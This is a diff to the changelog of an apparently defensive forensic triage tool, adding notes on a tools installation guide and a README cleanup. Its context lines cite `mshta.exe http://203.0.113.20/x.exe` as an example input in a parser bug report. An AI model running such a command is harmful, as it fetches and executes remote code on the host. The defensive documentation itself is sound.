@@ -35,6 +35,11 @@ exported analysis bundle, so an archived case records which build produced it.
   the Security log was cleared and only the live state can say the payload is still running.
   `tests/test_triage.py` rebuilds the same evidence without osquery and requires the address and
   artifact bridges to disappear.
+- **`docs/tools.md`: installing the external tools by hand.** What each component does, what breaks
+  without it, and the command the installer itself uses for it — for a machine with no outbound
+  network, a package that is too old, or a version to pin. It also states what is not pinned.
+- **The README stops holding what another document owns.** Its Cases and Bundles walkthroughs were a
+  second copy of analysis/README's sections for them; they are now a pointer.
 - **Two defects the review of the artifact parse found.** A value whose last argument ends in a
   program extension was returned whole, so `mshta.exe http://203.0.113.20/x.exe` minted a local
   `x.exe` and bridged it to unrelated hosts; the artifact is now the shortest leading run ending in a
